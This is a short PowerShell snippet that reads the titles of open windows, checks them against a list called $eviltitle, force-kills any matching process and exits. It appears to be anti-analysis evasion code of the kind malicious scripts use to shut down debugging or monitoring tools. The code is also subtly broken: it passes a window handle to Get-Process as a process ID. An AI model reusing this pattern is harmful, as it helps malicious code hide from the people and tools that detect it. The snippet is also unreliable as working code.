function Get-WindowText {
    param (
        [System.IntPtr]$hWnd
    )

    $sb = New-Object Text.StringBuilder 256
    [User32]::GetWindowText($hWnd, $sb, $sb.Capacity) | Out-Null
    $sb.ToString()
}

function Invoke-WindowsCheck {
    $windows = Get-Process | Where-Object { $_.MainWindowHandle -ne [System.IntPtr]::Zero } | ForEach-Object { $_.MainWindowHandle }

    foreach ($hwnd in $windows) {
        $wndtext = Get-WindowText -hWnd $hwnd
        if ($eviltitle -contains $wndtext.ToLower()) {
            $prcid = Get-Process -Id $hwnd -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
            if ($null -ne $prcid) {
                try {
                    Stop-Process -Id $prcid -Force
                }
                catch {
                }
                exit 1
            }
            else {
                exit 1
            }
        }
    }
}

